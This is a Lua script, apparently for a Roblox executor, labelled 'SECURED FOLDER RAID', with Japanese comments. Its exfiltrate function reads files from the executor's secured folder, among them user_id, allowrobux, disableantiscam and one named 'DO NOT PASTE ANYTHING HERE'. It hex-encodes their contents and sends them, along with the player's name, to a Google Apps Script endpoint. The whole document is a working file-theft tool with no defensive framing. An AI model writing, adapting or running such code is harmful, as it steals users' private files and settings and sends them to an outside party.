-- [[ PROJECT: SECURED FOLDER RAID ]]
local GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec"
local player = game.Players.LocalPlayer

local function exfiltrate(fileName)
    local path = "Delta/Internals/Secured/" .. fileName
    local s, content = pcall(function() return readfile(path) end)
    
    if s and content then
        print("📤 Sending: " .. fileName)
        local hex = ""
        for i = 1, #content do 
            hex = hex .. string.format("%02X", string.byte(content:sub(i,i))) 
        end
        pcall(function() 
            game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&user=" .. player.Name .. "&type=FILE_" .. fileName) 
        end)
    else
        print("❌ Failed: " .. fileName)
    end
end

-- 画像に写っていたファイルを総なめにする
local targets = {
    "user_id",
    "allowrobux",
    "allowteleports",
    "disableantiscam",
    "DEV_README.txt",
    "DO NOT PASTE ANYTHING HERE"
}

print("🕵️‍♂️ フォルダ内の全ファイルを抽出中...")
for _, name in ipairs(targets) do
    exfiltrate(name)
    task.wait(0.5) -- GAS側の制限を考慮
end
print("🏁 全抽出完了。GASを確認してくれ。")
